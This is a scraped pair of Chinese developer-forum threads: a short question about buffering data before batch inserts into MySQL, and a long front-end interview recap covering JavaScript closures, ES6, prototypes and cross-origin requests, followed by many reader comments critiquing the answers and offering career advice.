{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题, 请教一下各位:</p>\n<p>最近要设计一个准实时的数据流系统, 基本的功能是接受数据源发过来的数据, 做一些清洗转换, 转换成 MySQL 的数据表格式, 然后入库. 入库打算采用异步准实时的, 大概每隔一两分钟做一次批量插入数据库的操作.</p>\n<p>请教大家, 这个时间间隔内接收到的数据, 怎么暂存(用什么库 /框架之类),会比较好一些, 现阶段暂时在考虑有没有比较简单的方案先跑起来再说;  另外如果以后要扩展, 要考虑可靠性(比如宕机尽量别丢消息)之类呢?</p>\n<p>多谢大家.</p>\n</div></div>", "<div class=\"topic_content\">多谢各位!</div>"], "reply": "6", "tittle": "要设计一个准实时的数据流, 最后阶段每隔一分钟左右做一次入库, 这一分钟内积累的数据要暂存在哪?", "comment": ["看起来是 kafka 的菜？", "redis kafka", "一分钟数据量不大可以放内存。\r", "要宕机不丢数据，发送放得有重传机制，接收方得有持久化机制。各种消息队列+内存数据库，如 rocketMQ+Redis", "flume + kafka + storm  [滑稽", "mq 就搞定了", "谢谢大家, 最后用了某云服务的 message queue"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>两日前，发了一篇吐槽，莫名的火了一把。经过大家的建议与鼓励，于是修改了简历，开始了重新投递， 2 天后接到第一份面试邀请。</p>\n</blockquote>\n<h2>此文为个人面试经历， QA 问答过程与总结，不透露面试公司及面试人员，内容真实，如果有面试过我的大佬看到博客，欢迎指出问题。</h2>\n<blockquote>\n<p>循序可能有点乱，没记太清。</p>\n</blockquote>\n<h4>1.面试时间 2017.2.30 下午两点——公司薪资 6K</h4>\n<ul>\n<li><strong>Q ：请先做一下自我介绍</strong></li>\n<li>A ： barbarbar ，然而顺便谈了下自己的学习经历，讲了下自己在写的项目啥的。</li>\n<li>\n<li><strong>Q ：谈谈你对闭包的理解。</strong></li>\n<li>A ：关于闭包，我个人的理解用一句话概括就是：<code>一个函数在父级函数执行完毕后，如果任然留有对父级函数内部变量（作用域）的引用，那么就会建立闭包</code>，我个人对闭包就是这样的看法，如果有什么错误，请务必帮我订正....</li>\n</ul>\n<blockquote>\n<p>原文出自 js 面对对象编程指南 P88 ：如果一个函数会在其父级函数返回之后，留住对父级作用域的连接的话，相关闭包就会被创立起来</p>\n</blockquote>\n<ul>\n<li>\n<p><strong>Q ：谈谈你对 ES6 新的声明变量的方式的一些看法</strong></p>\n</li>\n<li>\n<p>A ：关于这个问题，新的方式，比较有趣的就是所谓的暂时性死区什么的，简单的来讲吧。关于的第一个 const ，其实就是声明一个常量，不允许变更。另一个 let ，就是零时变量，或者说是局部变量（这两个都属于局部变量），能够由中括号直接产生一个零时的局部作用域了，而不必使用以前的立即执行匿名函数了， let 非常适合在 for 循环之类的场景中使用，不再需要使用迭代函数就能获得当前的变量了，对比 var 来看，新的这两个变量声明都不会在执行时被提升，并且编译速度比 var 更快。</p>\n</li>\n<li>\n<p><strong>Q ：你说 const 声明的是常量，不能被改变喽？</strong></p>\n</li>\n<li>\n<p>A ： const 声明的的确是常量，只不过是字面量常量不能被改变，如果是对象类型的话，是引用，对象的属性被改变是无法被检测到的，就像 vue 中，父子组件中通信，以及数据，如果是对象属性被改变，是无法被检测到的。</p>\n</li>\n<li>\n<p><strong>Q ：你说 Vue 中如果对象属性被修改无法被检测到，那么你有什么解决方案？</strong></p>\n</li>\n<li>\n<p>A ：这个，其实我觉得最好的解决方案就是严格遵守 vue 的理念，父子组件通信时不去修改什么对象属性，对象数据的属性，非要改动添加的话：使用（ Object.assign() 或 _.extend()）面试时，没想起来单词怎么拼.....</p>\n</li>\n</ul>\n<blockquote>\n<p>关于对象属性的的修改的方法，有兴趣的可以了解下，<code>Object.defineProperty</code>（ vue 好像就是基于它实现的双向数据绑定，还没读源码，不清楚楚），<code>Object.assign</code>是把属性添加到对象的方法。</p>\n</blockquote>\n<ul>\n<li>\n<p><strong>Q ：关于数组去重复你用什么方法？</strong></p>\n</li>\n<li>\n<p>A ：因为目前我自己都是使用<code>ES6 + Webapck2</code>的方式写的代码，所以用的是<code>Array.from(new Set(arr)</code>或者<code>[...new Set(arr)]</code>的方式去重，原理是，用了 set 类型，允许重复的值得特性，然后使用 from 方法或者解构的方法来得到数组，关于其他的方法的话，有太多了，比如什么循环去重，什么迭代（ reduce ）啥的，我就懒得讲了，因为真的太多了。</p>\n</li>\n<li>\n<p><strong>Q ：你提到了 Set 类型，那你讲下对 Es6 里 Map 类型的看法。</strong></p>\n</li>\n<li>\n<p>A ：关于这个 Map 啊...（犹豫了一下）说实话，我没怎么去使用这个新的类型，毕竟怎么说好呢，目前我是将 Map 当成一个嵌套数组看待，毕竟 Map 和对象相比，只是比对象多提供了一个迭代用的接口，并且据说速度会比对象访问属性更快一点，现在来说，实在是没有什么使用场景，常用的一些工具函数，比如<code>下划线.js</code>和<code>lodash.js</code>(不知道单词是否拼错)，暂时都还没有提供对 map 的方法，但对象却有千千万的各类方法，并且， map 能够实现的对象类型也能够实现，比如迭代对象可以用<code>for (let [k, v] of Object.entries(obj))</code>，哦，最后一点差异就是允许 key 使用数字。不知道你有啥其他的看法嘛，或者知道 map 的一些使用场景，可以和我分享一下。</p>\n</li>\n</ul>\n<blockquote>\n<p>楼主只用过下划线.js...对于 loadsh.js 没提供是猜测的。另外对象迭代这里出自，阮一峰大神写的 ES6 入门指南，对象篇。完整的是：</p>\n</blockquote>\n<pre><code>let obj = { one: 1, two: 2 };\nfor (let [k, v] of Object.entries(obj)) {\n  console.log(\n    `${JSON.stringify(k)}: ${JSON.stringify(v)}`\n  );\n}\n// \"one\": 1\n// \"two\": 2\n</code></pre>\n<ul>\n<li>\n<p><strong>Q ：关于 new 一个对象，你讲一下，具体是怎么实现的？</strong></p>\n</li>\n<li>\n<p>A ： 什么？ new 一个对象，额，这个不就是一个构造函数，然后 new 一个新的对象嘛，还能有什么流程嘛。不太清楚，你具体问的内容哈，你是问，构造函数内容的执行逻辑原理还是啥？</p>\n</li>\n<li>\n<p><strong>Q ：那你谈一下对于原型的理解</strong></p>\n</li>\n<li>\n<p>A ：原型啊，从哪里开始讲呢，我之前好像写过篇关于原型的博文，要不看看博文？毕竟在我看来，这方面内容太广了，一定要讲的话，可以说，（比面试时稍微把逻辑更通一点，面试时太紧张逻辑有点乱）原型自身就是一个对象，有自己的属性与方法，默认情况下是有一个指针指向原型的构造函数，构造函数也有个指针指向自己的 prototype...然后由构造函数 new 出来的对象，在原型链上默认指向构造函数指着的原型。。。好吧，我编不下去了，说真的，这玩意我得有个图或者纸才好演示啊。。要不你给我张纸，我画个图？</p>\n</li>\n</ul>\n<blockquote>\n<p>廖雪峰大神写的教程非常棒，推介一下： <a href=\"http://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014344997013405abfb7f0e1904a04ba6898a384b1e925000\" rel=\"nofollow\">http://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014344997013405abfb7f0e1904a04ba6898a384b1e925000</a></p>\n</blockquote>\n<ul>\n<li>\n<p><strong>Q ：既然你原型不懂，那就谈谈原型链吧？</strong></p>\n</li>\n<li>\n<p>A: (心里活动：原型我得有纸才能演示，原型链，不得更需要纸吗)，啊，原型链啊，我之前真的自己写过篇关于原型链的整理，能给你看下博客吗？...你让我凭空讲...好吧，大概原型链就是...说实话，我现在用的都是 Es6 的 class 方法，虽然 class 也是基于原型链的语法糖，但是简单方便啊，所以我这段时间都都没怎么关心原型链的，毕竟原型链继承在 js 面对对象编程指南里写了十几种方法啊...我这人，有时候喜欢简单高效的东西，就像数组去重，我都用 set ，只有遇到一些相关问题，我才回去找新的解决方案。（后面把十几种方法拍张照给大家观摩观摩，虽然有些不是基于原型的）</p>\n</li>\n<li>\n<p><strong>Q ：你说你都是遇到问题再去解决，那你谈谈移动端一像素问题你是怎么解决的？</strong></p>\n</li>\n<li>\n<p>A ：移动端一像素啊，简单来讲，就是设置个伪类，然后响应下屏幕的 dpr ，用 css3 的缩放进行解决。用一些预处理器写个 mixin 函数就能解决。</p>\n</li>\n<li>\n<p><strong>Q ：有其他的解决方案吗？</strong></p>\n</li>\n<li>\n<p>A ：这个老实说，还真没研究过，在前面我提过，很多东西我都是遇到问题然后去解决的，如果目前有最优解决方案，我为啥要去用其他的，比如目前移动布局我用的就是 flex 布局，我感觉兼容性也不差。。。当然，主要原因也在于我没啥工作经验。</p>\n</li>\n</ul>\n<blockquote>\n<p>顺手再推一波阮一峰大神的 flex 教程： <a href=\"http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html?utm_source=tuicool\" rel=\"nofollow\">http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html?utm_source=tuicool</a></p>\n</blockquote>\n<ul>\n<li>\n<p><strong>Q ：你有使用过 css 预处理器吗？</strong></p>\n</li>\n<li>\n<p>A ：目前在使用 stylus ， less 也有接触过， stylus 我主要喜欢无需括号，以及变量或者函数不用加什么奇怪的前缀</p>\n</li>\n<li>\n<p><strong>Q ：对于手机应用你有过了解吗？</strong></p>\n</li>\n<li>\n<p>A ：如果指的是混合开发的 webapp 手机应用，我最近研究过 weex ，就是阿里去年开源的那个类似 react native 的，目前正准备写点什么个人项目，但是因为时间缘故所以暂时还是只计划。</p>\n</li>\n<li>\n<p><strong>Q ：对于性能优化，你有什么方案？</strong></p>\n</li>\n<li>\n<p>A ：性能优化啊，说实话，我目前因为主要都是自己的作品，没遇到过什么特别徐亚哟优化的地方，如果一定要讲的话。。。好吧，我简单讲一下吧，比如不要使用全局变量，因为相比局部变量，全局变量被索引时的速度最慢；不要过多使用闭包，闭包会占用内存；要对闭包中需要递归的地方进行尾递归优化不然容易导致内存泄漏（主要好像是 ie 下，没有实际测试过），对 script 标签进行合并，毕竟页面遇到 script 标签就会停止渲染（主要是因为浏览器不能确定 script 标签会不会改动 dom ），在使用 ajax 时，对一些内容尽量使用 get （ get 默认会保留缓存），额...还有的话，说实话，我来面试前忘了去找份面试指南背，很多东西由于我没有实际的遇到过我并没有太过深入。如果是我遇到过得问题，我详细我应该能够了解。说起来之前拜读过一本叫做 js 函数式编程指南的..因为内容有点深，就只看了部分。</p>\n</li>\n</ul>\n<blockquote>\n<p>关于全局变量被索引的速度最慢，出自高性能 js...没有实际测试过，闭包内递归要使用尾递归优化，附送上连接，同样是阮一峰大神的： <a href=\"http://www.ruanyifeng.com/blog/2015/04/tail-call.html\" rel=\"nofollow\">http://www.ruanyifeng.com/blog/2015/04/tail-call.html</a>  ，关于 js 函数式编程指南连接： <a href=\"https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/\" rel=\"nofollow\">https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/</a>  （非常赞的一本免费电子书，不知为何，关注的人很少）</p>\n</blockquote>\n<ul>\n<li>\n<p><strong>Q ：你提到了 ajax ，那就谈下 ajax 吧。</strong></p>\n</li>\n<li>\n<p>A ： ajax 啊，这玩意其实很简单，主要就是异步的从后端获取数据嘛，搞来搞去也就那么些接口啥的，在初学 js 时，我为了能响应 ajax 还简单的学了 php ，就是后端提供接口，前端用 get 或者 post 或者其他方式去请求数据，不会让页面停止运行啥的，目前我在写的项目中接入了聊天机器人，由于跨域问题，就用 node 做了个中转层，用来转发对机器人 api 的请求，流程就是前端请求本地的服务器，服务器请求机器 api...</p>\n</li>\n<li>\n<p><strong>Q ：你对于跨域的解决方法了解多少？</strong></p>\n</li>\n<li>\n<p>A ：前端跨域吗，最常用的应该是 jsonp 吧，后端动态生成 script （能够执行的 js 函数），然后把数据发送过来。或者是用 node 做个中转层啥的，方法好像挺多， H5 也有种新的方案，不过没深入研究。</p>\n</li>\n<li>\n<p><strong>Q ：我们这边后端用的不是 node ，是 java ，你怎么使用 jsonp 。</strong></p>\n</li>\n<li>\n<p>A: 啊， java 不能返回动态的 script 吗？我之前学过的 php 好像行，现在在学的 python 也行啊。</p>\n</li>\n<li>\n<p><strong>Q ： python 是什么？</strong></p>\n</li>\n<li>\n<p>A ： python 就是...它是一门编程语言，当初学 node 写爬虫时，发现 node 用模块模拟的多线程本质还是单线程，并且错误处理还麻烦，我还得用进程维护模块去启动...然后上网查，发现都说 python 好，于是就开始学了些 python ，把教程简单过了遍，后来因为些事情所以就没怎么碰了。。。。</p>\n</li>\n</ul>\n<blockquote>\n<p>安利下廖雪峰大神的 python 教程： <a href=\"http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000\" rel=\"nofollow\">http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000</a></p>\n</blockquote>\n<ul>\n<li>\n<p><strong>Q ：那你现在目前在做什么</strong></p>\n</li>\n<li>\n<p>A ：目前，有个个人博客在写完成度太低，所以没有开源，后端使用 koa2 （优雅的 async 函数才是我的追求， express 的嵌套，见鬼去）正考虑前端要不要上个 react ，毕竟我目前一直在深入 Vue2 ，对同样是 Mvvm 的 react 好像没做过啥具体项目。</p>\n</li>\n<li>\n<p><strong>Q ：其他对公司有什么想问的嘛？</strong></p>\n</li>\n<li>\n<p>A ： barbarbarabr （问了些关于公司结构的问题）</p>\n</li>\n</ul>\n<hr>\n<p>不知道为何，面试当天就被告知未通过，我在想，果然是因为没有背过前端面试题嘛。。。还是原型那里没回答出了问题，对于面试官，一直带着笑容，然而，一些反问的内容均未给出回复。。。全程笑眯眯。。年龄目测比我年长几岁的样子。。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><hr>\n<h2>更新</h2>\n<ul>\n<li>由于面试失败，并且文章是个人总结，所以总会带有个人色彩，但是实际面试中客气很多，文章中省略了很多礼貌用语.....添了些个人情绪。</li>\n<li>经过与一个前辈的聊天，自知自己所学的东西都只是入门，没有一样深入的，所以请不要误会以上内容为....会误会的自行脑补即可Q.o，真的只是实际总结，毕竟该学的东西远远没有学完，生命不息，学习不止。</li>\n</ul>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><hr>\n<p>关于楼主的回复，希望不要太在意，为啥这么针对性的回复了挺多人，原因只有一个：刚刚看完不少东西，刚闲下来，看到竟然有挺多评论，就大多都给了回复，回复只是对学习的解压........学习之余总得找点事干不是嘛........不是有意针对的来着，如果感觉楼主语气不好，请不要在意，这个附加的帖子就做道歉用好了。。。。。。。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><hr>\n<ul>\n<li>很高兴，有部分朋友说我6k应该没啥问题。。。。得到认同挺高兴的。</li>\n<li>在部分评论中，可能有些误会，简单来说，楼主并没有两年学习经验，真正接触js是在16年之后，之前只接触过html+加css3，连h5和css3是啥都不清楚。。。标题中的两年xx只是为了呼应前两天一篇关于个人学历经历的文章...不要在意标题党的问题：<a href=\"https://www.v2ex.com/t/350869#reply161\" rel=\"nofollow\">https://www.v2ex.com/t/350869#reply161</a></li>\n<li>找6000+的工作实在是因为，目前找3000+的实习工作，找不到才开始被一些好心的朋友劝说去找找更高的。。。主要是因为学历不是本科，专业不是计算机，基本实习直接过不了hr这关......楼主也自知学的东西都太浅，本想把一些东西整理下，深入后再寻找工作，然而身上目前只剩1600，下个月要交房租，要吃饭......总是要在现实面前低个头的。</li>\n<li>好吧，早上做个回复，下午又有一项目面试，祝自己好运了哈。。。</li>\n</ul>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><hr>\n<blockquote>\n<p>不知道为啥，刚偶然看到条回复，忍不住又加了这条附加.......第一次有人认为我客气来着。</p>\n</blockquote>\n<ul>\n<li><strong>Q:客气的有点过了，让人觉得别扭，这不是礼貌的问题，而是不自然</strong></li>\n<li>A:这没办法......从性格上来说，暂时只有在一些问题跟人起争执才会.....另外就是相当熟悉的朋友.....毕竟就网上评论来说，每个人都有自己的意见看法，比如键盘侠，比如愤青，单单靠言辞犀利是没办法得到别人认同的，索性就客气点。。。。。另外说实话，由于非科班出身，非计算机专业，这两项就足够让我在面试的时候保持谦卑了.....（自卑？不够自信？...自己也没有仔细的审视过内心）。</li>\n</ul>\n</div></div>"], "reply": "96", "tittle": "关于第一天的前端求职经历（ 2 年悲愤 xx 后续）。——已被当天告知未通过", "comment": ["很明显看得出基本功不太够，而且描述的大多是现象而不是原理，这看起来会很水\r", "面试失败而已，没什大不了的，其实面完面试官好心的话会给你指出有什么问题的，问这个问题也不丢人\r", "虽然不说公司名，随便透人家面试题也是不好的", " 的确，很多方面都是现象，因为很多东西没有实际遇到过，只能就着自己的想法与曾经看过的东西回答，关于失败的原因，问了，但是没有给回复。另外关于透露面试题..........这个..........不至于每次都问相同的吧，不知道是否有自己看过每个问题，基本都是顺着楼主的回答来问的.......", " 订正下内容...仔细.....", "倒数三四个问题看得出面试官是傻逼。", "背啥面试题 多看点好的开源项目 看看 issue 修一修 bug  ", "自己的代码质量自然而然就上去了 都不知道怎么写错的代码  ", "而且好的项目都带了性能测试 多交流一下能学到很多 而且根本不会忘 比背面试题好多了", "  ", "记得前段时间看一遍文章 就说学一门新语言 最好的联系方法就是找相关项目的 beginner friendly 的 issue 去解决", "谢谢经历，很有帮助！感觉 80%自己答不上。", "以上问的问题我都稍微知道点 基本没怎么深入 确实都是开发中遇到问题才花时间去学习\r", "感觉你比我强多了~", " 背面试题主要是为了解决近期找工作的困境，，，至于水平的提高当然是你说的了", " 其实还好，问的问题基本也都是根据回答来来问的。条理也较清晰，关于原型还有些地方，感觉的确是回答的有问题，当然关于后面的倒是 34....一开始我和你想法差不多，后面想了想估计可能是故意问的吧，毕竟很多问题问的也比较有针对性。", "只拿 6k ，答成这样绰绰有余了。", "大概看了前半部分，后面前端的事情不太懂（没错我只写服务器端 JS ），感觉楼主还是有很多编码经验的，但感觉就是没认真准备面试。就比如原型链和 new ，确实不常用的话突然让你说也说不清楚，但我觉得只要是去面试 JS 就一定会提前重新复习一下原型链的知识吧。", "没注意 lz 是学了两年的水平。。估计是学习能力的评价不高。", " 这个两年怎么说呢，，真的只是标题党，，标题两年，具体开始碰 js 才一年不到。。。之前是 html+css 写写页面，连 h5 ， css3 都没碰过。。", "个人觉得面试还是要避重就轻点，回答面试官问题不宜过多提到自己薄弱的东西，不然面试官追问下去相当于给自己挖坑。", "从 map 开始就有点打胡乱说的意思了， Object.entries 是 es7 特性要求 chrome54+，感情写个遍历还要做浏览器兼容？？接下里太惨了。。。。", "你现在要做的不是发帖，而是一项一项把这些问题全给查出来，否则面一百次都一样。好多问题你本来就不知道，如果你还说这是“背”面试题，那我觉得你可能真的不适合这行", " 我自己写代码基本都是 webapck2 编译后使用的，主要是 async ，解构， class 这几样特性用的比较多，并且面试时，我讲的是个人的观点，如果有需求，当然可以用普通的比如 for in 啥的去实现，为啥就胡说八道了。难道就不能用 webapck 编译，必须自己写兼容性的 es3 ？好吧，这条回复的语气冲了点，不要在意，只是有点小气愤", " 你的回答再次错了，第一点，转译 es7 语法的不是 webpack 而是 babel ，第二点， babel 只转语法不转 api 还需要另行配 preset", " Q.o 凌晨一点还没睡，显然在查资料，然而很多东西深入下去不是一周或者一个月能搞定的，目前身上只剩 1600 ，下月却要交 1000+房租，加吃饭，不知道何以教我?，一侧是现实，一侧是理想，总得先把日子过下去才能谈理想，未来吧？", "楼主不要一味以为是别人的问题，还不如多做准备", " ...我的错，但是想必我们都是清楚，我想表达的是什么意思，如果非要抓着这个语病，那我没话讲，因为事实在，是我的错。但是何必呢？面试中提到的也是，现在写的 es6 ， es7 基本上线不都是编译后的吗？为啥你的第一想法是直接拿到浏览器里谈兼容性..........", " 从你的话里只能看出你只知道 webpack2 不知道 babel6 ，至于第一想法谈浏览器兼容性，这难道不是用个 Object.assign 都要考虑兼容的前端们的本能反应吗，有什么问题？？", " 至于理想和现实，说到底还是自己不够强，我建议你寻找家里的帮助先沉淀几个月，因为就算你今天面试成功明天入职， 4 月份你还是没工资的，大家基本都是 4 月份发 3 月份的工资，今天已经 3 月 31 号了。", "楼主自学能力还是可以的，不过感觉有点浮了。你现在用的技术栈可能很多小公司都没有上，没录你，可能也不是因为你能力不够，而是不符合他们的要求，能理解？", "6k 答的可以了，如果只挑对的地方看。自己莫名其妙答了很多只懂一点然后比较模糊的东西。这样会给面试官带来不好的印象。\r", "Vue 对象属性被修改无法被检测，是说实例对象不要动态修改上面的属性吧，这里用 Vue 的 set api ，跟父子组件传递有啥关系，父组件改改数据对象的属性，子组件照样响应啊。\r", "new 怎么实现，就是你说的\"你是问，构造函数内容的执行逻辑原理还是啥？\"。你把 new 一个构造函数的流程再封装成函数不就是实现了嘛。 new 一个函数的流程高程里有，相信你看过。\r", "原型原型链，就算继承用的少应该也要放在脑子里了，必考点。公司希望你用 class ，但是面试官一般希望你能实现 class ，就像上面实现 new 一样。\r", "性能优化里你用的多的 webpack 没讲，压缩代码分割异步加载等，应该是紧张了，面试要挑自己熟悉的讲啊。然后函数式一般都是降低性能换取可读易维护，不知道为什么要提。\r", "ajax 是简单，但是你只光说简单，没有让人信服的理由。应该说说 xhr 这种过程式的接口设计有什么问题，对比各种 ajax 库或者 fetch api 声明式的接口，你要说出是因为这样才让你觉得简单的。\r", "遇到问题再去解决是很好的，但是不能拿来炫，因为每个工程师都是这样。愿意在遇到问题前深究的工程师岂不是更棒？\r", "下次用更加职业的心态去面试吧，参加面试，就不是学生了。\r", "写了很多，有感而发，像是当年的自己(或者说大家？)。原型只是小问题， 6k 的期望你不应该答出\"其实我值 12k\"的态度。", "继续面吧，只点到为止的答。 6k 没问题", "这面的什么鬼……\r", "6k 的单位是啥？", "面试问这些问题，感觉是招 12K+的", "答太多了。说话要有重点，不要乱飘。不懂就说不懂。\r", "\r", "公司水平不高，不认识 python", "其实我面过很多前端，这个面试官但我问题我也基本会问。\r", "从回来能看出来是理论派，实战项目经验不多。所掌握的知识面比较广，但深入度不够。\r", "另外关于 python 是什么的问题，我基本可以判断是发音问题，面试官听不懂，而你的解释没有说清楚到底 python 是个啥。\r", "如果是我面试， 如果自学半年到一年这个水平，我会给机会以初级待遇招进来。 如果自学或工作两年是这个深度，我可能也会再选选。", "这个水平 6k 已经没问题了 要注意的一点是 他问你的问题他肯定是会的 所以比如 prototype 这个东西 他是会的 你不需要画图 说重点 证明你也会就可以了 让人家看博客属于避重就轻的答法 一般不会的时候才会这样", " 请看我上一篇文章，楼主找的是实习工作啊。。只是因为实习的投了无数简历都石沉大海后才被人劝说投点大于 4000+的，才获得了面试机会", "如果觉得背出书里的内容就能拿高分，那么应该去参加考试而不是面试；\r", "\r", "如果写完博文，就把“东西”都交给博文，那么到底是招你入职，还是招“博文”入职，还是招你来写博文呢？", " 感谢回复，评论这么长，想必是占用了些时间认真看了。对于 Vue 那块，怎么说的，脑子里懂，但实际面试紧张了很多，逻辑就乱了，文章是大多照着还原真实写的。写完之后自己再看，果然发现了很多问题。", "其实这个回答我觉得还行，相对于 6k 来说，作为面试官的角度，其实我更喜欢让面试者写和画，这样更容易看出来面试者的编码能力。其我觉得你没通过的原因是没镇住面试，并且两年这个水平基本上是太普通了。", "6k 足够了这种回答。全答上了 10k 水平起。从回复串来看，我觉得有几位不是装 X 就是工资倒挂了。\r", "没过面试可能是表达能力不行或者其他原因比如户籍啊长相啊之类的 2333", "就前端来说，性能优化一个问题绝对不符合一个初级前端的要求，性能优化……看得出楼主只是个学会用 vue 全家桶或者只学了 js 的人。 ajax 的回答也很水", "Q ：谈谈你对闭包的理解。\r", "科班的在这里可能会讲一讲 bound variable vs free variable 。如果基础不好的话这里可以多谈一谈 closure 的应用，比如构造 higher order function ，\r", "\r", "Q ：你说 Vue 中如果对象属性被修改无法被检测到，那么你有什么解决方案？\r", "这个问题你没有直接回答，而是取巧了 😂。检测对象属性修改有很多方法，包括 proxy binding 等\r", "\r", "Q ：关于数组去重复你用什么方法？\r", "这里用 [...set()] 确实很优雅。面试官问这个问题有些考算法的味道，可以一句话带过，例如用 hashset 做去重或者先排序后去重等。\r", "\r", "Q ：对于性能优化，你有什么方案？\r", "谈性能优化，先做 profiling 。\r", "\r", "Q ：你对于跨域的解决方法了解多少？\r", "这里没提到 CORS 是减分哦\r", "\r", "Q ：我们这边后端用的不是 node ，是 java ，你怎么使用 jsonp 。\r", "Q ： python 是什么？\r", "这两个太逗了\r", "\r", "Q ：那你现在目前在做什么\r", "你卖弄了面试官听不懂的 nodejs ES7 什么的 😂", "座标帝都，工位对面拿 6K 的所谓前端连 URL 每部份都是啥都答不出， Vue/React 没听说过，闭包、原型更是完全不懂， Chrome 调试工具不会用， CSS 只会乱加 important 。所以多学多试多找机会吧。", "看的出楼主至少还是很好学的，值得鼓励，静下心来好好准备下，一定可以找到满意的工作， ps 我这工作好多年的对于上面的有些问题答的估计也是一知半解", "Q ：我们这边后端用的不是 node ，是 java ，你怎么使用 jsonp 。\r", "\r", "Q ： python 是什么？\r", "\r", "\r", "这 tmd 什么问题....\r", "知道自己在说什么吗.. 我擦咧\r", "\r", "还有就是楼主这个水平 二线城市我感觉拿 8k 不成问题啊. \r", "一般都是通知拿 offer 不通知默认没有 还第一次听说有通知拒绝的..", "散华礼弥不太常见呐\r", "\r", "我感觉楼主比我强多了， 2017 届现在是不好找工作(ーー;)", "我觉得 lz 挺好的 再多面试几家公司试试", "如果你以前是完全不会写程序， 16 年开始学现在有这个水平不坏\r", "\r", "有些原理性的东西确实了解不够：包括 new 的行为，原型链\r", "\r", "新技术 (包括 Map) 可以多了解一下。如果我是面试官，`Map 和对象相比，只是比对象多提供了一个迭代用的接口` 这样强行答的肯定要扣分\r", "\r", "公司 rp 不错，拒就拒了不会吊着你", "太牛逼了 一个不会", "回答扯得太远了。。。而且扯得东西说的不准", "感觉楼主技术水平一线 8k 也是可以的,就是学历低一点,另外简历写的也太烂了", "面试官是煞笔。。。\r", "\r", "Q ：我们这边后端用的不是 node ，是 java ，你怎么使用 jsonp 。\r", "Q ： python 是什么？", "感觉楼主比我厉害......", "什么， 6K 的前端需要会这么多？", "我们这边后端用的不是 node ，是 java ，你怎么使用 jsonp\r", "\r", "这面试官是弱智么？ spring 加了配置轻松 jsonp 就开出来了，简直给 java 丢脸", "Q ：我们这边后端用的不是 node ，是 java ，你怎么使用 jsonp 。 \r", "Q ： python 是什么？\r", "笑了", " ，提醒一下你，面试官面人的时候提的问题大部分是根据你的简历上写的内容来的。所以 LZ 自己写了 node ， python ，面试官当然会问。\r", "==== 华丽的分割线 ==== \r", "从这里可以看出，一份好的简历对求职者来说有多重要，比如你面前端，尽量别把 php 、 python 扯进来。否则别人一发问，多半是两三个问题直接放倒，对你来说只能起到减分的效果。从目前的行情来看，对准前端、 nodejs 、 php 、 python 。。。这些岗位来准备简历，只要学的内容足够深，能写的东西已经很多了。", "我们这边后端用的不是 node ，是 java ，你怎么使用 jsonp ，这是不是在胡说八道， jsonP 和后端语言有毛线关系", "楼主坐标哪里?", "这面试官问的太偏理论了，，，，", "初级前端的话还是要专注于自己干活的能力，是否能够完成领导交给的任务，而不是这也知道那也知道，你在研究的这些是前端的前沿领域，可能只是<em>加分项</em>。\r", "\r", "我最近因为要换城市，也在面试，惊讶的发现某些大公司的高级前端其实也不熟悉 ES6 的，我写个 let 人家也是一脸蒙逼说你写的这是啥。但是又怎样，暂时不会 ES6 并不会影响他们是否能够保质保量的完成任务。\r", "\r", "现在前端圈对于新人最大的误导就是你一定要会 ES6 ，一定要懂 React/Vue ，一定要会用 Node ，但是实事求是的说，这些技术栈并没有完全在行业落地，大部分公司还是在沿用五年前甚至十年前的技术栈，连 use strict 都没有用过，招的新人总是在强调自己会这些东西可能会减分，除非你是个资深工程师过来帮他们升级前端团队和技术栈的。", " 是啊，我写代码也基本上是 ES5 ，习惯了", "自己觉得自己努力了，就要社会给你相应的回报，是年轻人要破除的第一个执念。", "我这边 6K 左右都是菜鸟水平，除了学历，跟楼主比差远了", "Q ： python 是什么？\r", "这个有没有可能是发音问题导致的 ", " ", "6K 也就招个啥也不会的白纸吧 楼主答成这样 6K 够了", "牛 B", " 233 其实也想问这句来着", "面试中运气成分也很重要的，有时候面试官和你看得对眼，聊得来，比你自身实力更关键，楼主长得怎么样？", "LZ 放平心态，不要被自己现在的客观条件限制，也不要老是在面试的时候强调自己怎么怎么能学习，就把自己作为一个正常面试的程序员，多表达自己具备什么技能。", "报个坐标吧 一线城市 6K 基本找来的就是听说过 jquery 和 bootstrap 的白纸", "坐标杭州吗。来北京面不。", "。。楼上一线城市里肯定没广州吧...我期望 6k 上面题目回答和 LZ 差不多水平...", "你想多了，单纯是因为面试官的个人喜好，发现你没有被掰弯的可能就拒了", "看到这些问题，我感觉我已经不会前端了(*^_^*)", "这个面试官的问题我都不会，什么 ES6 、 const 、闭包我全都不懂，但目前所有的网页前端 js 特效我都会写，随便给我一个网页大言不惭的说我看一眼就知道整体的 css 是怎么编写的了，从 IE8 到 chrome ， css 和 js 都写一次就通过，一个 jQuery 战天下，不给我 jQuery 用原生 js 也能写，想知道这种人面试官是喜欢我还是拿着刀赶我出去", " 非常同意你的说法。我刚看的时候也觉得看描述楼主还不错，但总是觉得有哪里不太对劲。\r", "虽然我在业务线里也推 es6, 但是面试我不会问。 我会选择问 http/tcp ，基本算法， js 底层 ... 想对于 api 而言，考察面试者的工程师素养更重要。\r", "就相当于招一个 java 工程师， 他会不会 java8 ，其实并不是很重要。\r", "楼主是挺不错的， 但确实不应该太强调 api 层面的东西，加油吧。", "楼主是没毕业吗？在上海吗？很多前端刚培训完就 10k 了", " 前两个不懂就算， 比包不懂就赶人了 23333333", " 闭包，打错了", "楼主的水平找个 6-8k 的工作，一点儿问题没有。工作之后积累实战经验吧，加油！\r", "一个小建议就是，回答问题，自己了解的就深入讲讲；不清楚的，点到为止即可，别发散", "我个人感觉哈：\r", "①HR 一问什么新的东西你就说 [没深入研究] ， HR 